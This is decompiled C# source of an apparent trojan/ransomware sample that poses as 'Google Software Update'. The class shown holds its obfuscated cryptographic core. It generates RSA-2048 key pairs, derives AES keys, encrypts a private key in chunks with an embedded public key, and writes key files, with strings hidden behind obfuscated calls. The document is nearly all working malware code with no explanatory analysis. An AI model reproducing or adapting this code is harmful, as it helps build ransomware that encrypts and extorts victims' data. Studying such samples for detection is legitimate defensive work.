// Decompiled with JetBrains decompiler
// Type: C3904355907.C3463352047
// Assembly: Google Software Update, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 1ECCB2B4-E3D0-48EA-84ED-06938D43796B
// Assembly location: C:\Users\Administrateur\Downloads\toto\HEUR-Trojan.MSIL.DelShad.gen-b37761715d5a2405a3fa75abccaf6bb15b7298673aaad91a158725be3c518a87.exe

using \u003Cdion2ntty2ic0uyoe\u003E\u007B43570453\u002D3AD8\u002D4A5B\u002DB273\u002D83DF8156D820\u007D;
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Xml.Serialization;

namespace C3904355907
{
  public sealed class C3463352047
  {
    private static C3554254475.C2181537457 C3554254475;
    private static C3554254475.C2181537457 C3904355907;
    public static byte[] C3554254475;
    public static byte[] C3904355907;
    public static byte[] C1255198513;
    public static byte[] C1908338681;
    public static string C3554254475;

    private C3463352047()
    {
    }

    public static void C3554254475([In] ref byte[] obj0, [In] ref byte[] obj1, [In] ref C3554254475.C2181537457 obj2)
    {
      C3463352047.C1255198513 = new byte[obj0.Length];
      C3463352047.C1908338681 = new byte[obj1.Length];
      Array.Copy((Array) obj0, (Array) C3463352047.C1255198513, obj0.Length);
      Array.Copy((Array) obj1, (Array) C3463352047.C1908338681, obj1.Length);
      string xmlString = DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.cz();
      C878818188.C3554254475(ref xmlString, ref obj2);
      using (RSACryptoServiceProvider cryptoServiceProvider = new RSACryptoServiceProvider())
      {
        cryptoServiceProvider.FromXmlString(xmlString);
        obj0 = cryptoServiceProvider.Encrypt(obj0, true);
        obj1 = cryptoServiceProvider.Encrypt(obj1, true);
      }
    }

    public static void C3554254475(
      [In] ref byte[] obj0,
      [In] ref byte[] obj1,
      [In] ref byte[] obj2,
      [In] ref byte[] obj3)
    {
      string xmlString = DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.cz();
      C878818188.C3554254475(ref xmlString, ref C3463352047.C3904355907);
      using (RSACryptoServiceProvider cryptoServiceProvider = new RSACryptoServiceProvider())
      {
        cryptoServiceProvider.FromXmlString(xmlString);
        obj1 = cryptoServiceProvider.Decrypt(obj0, true);
        obj3 = cryptoServiceProvider.Decrypt(obj2, true);
      }
    }

    public static void C3554254475([In] ref byte[] obj0, [In] ref byte[] obj1)
    {
      obj0 = new byte[32];
      obj1 = new byte[12];
      using (SHA512Managed shA512Managed = new SHA512Managed())
      {
        byte[] buffer = C2746444292.C3554254475().C3554254475(64U);
        byte[] hash = shA512Managed.ComputeHash(buffer);
        C878818188.C3554254475(ref buffer);
        Array.Copy((Array) hash, (Array) obj0, 32);
        Array.Copy((Array) hash, 32, (Array) obj1, 0, 12);
        C878818188.C3554254475(ref hash);
      }
    }

    public static void C3554254475([In] ref C3554254475.C2181537457 obj0, [In] ref C3554254475.C2181537457 obj1)
    {
      using (RSA rsa = (RSA) new RSACryptoServiceProvider())
      {
        rsa.KeySize = 2048;
        string xmlString1 = rsa.ToXmlString(true);
        byte[] bytes1 = C3554254475.C1130791706.C1255198513().GetBytes(xmlString1);
        obj0 = new C3554254475.C2181537457(true, bytes1);
        C878818188.C3554254475(ref xmlString1);
        C878818188.C3554254475(ref bytes1);
        string xmlString2 = rsa.ToXmlString(false);
        byte[] bytes2 = C3554254475.C1130791706.C1255198513().GetBytes(xmlString2);
        obj1 = new C3554254475.C2181537457(true, bytes2);
        C878818188.C3554254475(ref xmlString2);
        C878818188.C3554254475(ref bytes2);
      }
    }

    public static string C3554254475([In] string obj0, [In] string obj1)
    {
      byte[] hash = SHA256.Create().ComputeHash(Encoding.ASCII.GetBytes(obj1));
      byte[] numArray = new byte[16];
      Aes aes = Aes.Create();
      aes.Mode = CipherMode.CBC;
      byte[] destinationArray = new byte[32];
      Array.Copy((Array) hash, 0, (Array) destinationArray, 0, 32);
      aes.Key = destinationArray;
      aes.IV = numArray;
      MemoryStream memoryStream = new MemoryStream();
      ICryptoTransform decryptor = aes.CreateDecryptor();
      CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, decryptor, CryptoStreamMode.Write);
      string empty = string.Empty;
      try
      {
        byte[] buffer = Convert.FromBase64String(obj0);
        cryptoStream.Write(buffer, 0, buffer.Length);
        cryptoStream.FlushFinalBlock();
        byte[] array = memoryStream.ToArray();
        empty = Encoding.ASCII.GetString(array, 0, array.Length);
      }
      finally
      {
        memoryStream.Close();
        cryptoStream.Close();
      }
      return empty;
    }

    public static void C3554254475()
    {
      if (C3463352047.C3554254475 == null)
      {
        Trace.WriteLine(DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.IT());
        C3463352047.C3554254475(ref C3463352047.C3554254475, ref C3463352047.C3904355907);
        C3463352047.C3554254475(ref C3463352047.C3554254475, ref C3463352047.C3904355907, ref C3463352047.C3554254475);
      }
      else
      {
        if (C878818188.C3554254475.Next(1, 100) > 5)
          return;
        Trace.WriteLine(DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.It());
        C3463352047.C3554254475(ref C3463352047.C3554254475, ref C3463352047.C3904355907);
        C3463352047.C3554254475(ref C3463352047.C3554254475, ref C3463352047.C3904355907, ref C3463352047.C3554254475);
      }
    }

    public static byte[] C3554254475([In] string obj0, [In] RSAParameters obj1)
    {
      if (string.IsNullOrEmpty(obj0))
        return (byte[]) null;
      RSACryptoServiceProvider cryptoServiceProvider = new RSACryptoServiceProvider();
      cryptoServiceProvider.ImportParameters(obj1);
      byte[] bytes = Encoding.UTF8.GetBytes(obj0);
      return cryptoServiceProvider.Encrypt(bytes, true);
    }

    public static RSAParameters C3554254475([In] string obj0) => (RSAParameters) new XmlSerializer(typeof (RSAParameters)).Deserialize((TextReader) new StringReader(obj0));

    private static byte[] C3554254475([In] byte[] obj0, [In] byte[] obj1)
    {
      byte[] numArray = new byte[obj0.Length + obj1.Length];
      int index1 = 0;
      for (int index2 = 0; index2 < obj0.Length; ++index2)
      {
        numArray[index1] = obj0[index2];
        ++index1;
      }
      for (int index3 = 0; index3 < obj1.Length; ++index3)
      {
        numArray[index1] = obj1[index3];
        ++index1;
      }
      return numArray;
    }

    public static byte[] C3554254475([In] byte[] obj0, [In] int obj1, [In] string obj2, [In] bool obj3, [In] bool obj4)
    {
      RSACryptoServiceProvider cryptoServiceProvider = new RSACryptoServiceProvider(obj1);
      cryptoServiceProvider.FromXmlString(obj2);
      int num1 = obj1 / 8 - 42;
      int length = obj0.Length;
      int num2 = length / num1;
      byte[] numArray1 = new byte[0];
      for (int index = 0; index <= num2; ++index)
      {
        byte[] numArray2 = new byte[length - num1 * index > num1 ? num1 : length - num1 * index];
        Buffer.BlockCopy((Array) obj0, num1 * index, (Array) numArray2, 0, numArray2.Length);
        byte[] numArray3 = cryptoServiceProvider.Encrypt(numArray2, obj4);
        if (obj3)
          Array.Reverse((Array) numArray3);
        numArray1 = C3463352047.C3554254475(C3463352047.C3554254475(numArray1, BitConverter.GetBytes(numArray3.Length)), numArray3);
      }
      cryptoServiceProvider.Clear();
      return numArray1;
    }

    public static string C3554254475([In] string obj0, [In] byte[] obj1, [In] byte[] obj2)
    {
      Aes aes = Aes.Create();
      aes.Mode = CipherMode.CBC;
      aes.Key = obj1;
      aes.IV = obj2;
      MemoryStream memoryStream = new MemoryStream();
      ICryptoTransform decryptor = aes.CreateDecryptor();
      CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, decryptor, CryptoStreamMode.Write);
      string empty = string.Empty;
      try
      {
        byte[] buffer = Convert.FromBase64String(obj0);
        cryptoStream.Write(buffer, 0, buffer.Length);
        cryptoStream.FlushFinalBlock();
        byte[] array = memoryStream.ToArray();
        empty = Encoding.ASCII.GetString(array, 0, array.Length);
      }
      finally
      {
        memoryStream.Close();
        cryptoStream.Close();
      }
      return empty;
    }

    public static void C3904355907()
    {
      Trace.WriteLine(DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.IU());
      Trace.Indent();
      if (File.Exists(C3110715001.C1255198513))
      {
        Trace.WriteLine(DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.Iu());
        C878818188.C3554254475(C3110715001.C1255198513, ref C3463352047.C3554254475);
      }
      else
      {
        Trace.WriteLine(DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.IV());
        C3463352047.C3554254475(ref C3463352047.C3904355907, ref C3463352047.C3554254475);
        C878818188.C3904355907(C3110715001.C1255198513, ref C3463352047.C3554254475);
        string s = DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.cz();
        C878818188.C3554254475(ref s, ref C3463352047.C3904355907);
        string base64String = Convert.ToBase64String(C3463352047.C3554254475(Encoding.Default.GetBytes(s), 2048, C3463352047.C3554254475, false, true));
        C878818188.C3554254475(ref s);
        C1801730948.C3554254475(base64String);
      }
      Trace.Unindent();
    }
  }
}
